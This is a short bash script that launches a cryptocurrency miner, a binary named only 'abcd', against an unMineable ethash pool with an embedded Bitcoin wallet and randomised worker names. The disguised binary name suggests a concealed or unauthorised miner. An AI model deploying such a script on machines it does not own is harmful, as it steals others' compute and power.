#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=BTC:bc1qzmqelgtaw5gq9k3a5ee2euwy0xegdydutdsfp2
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-ZORO#bdfc-cm6i)
chmod +x abcd
./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
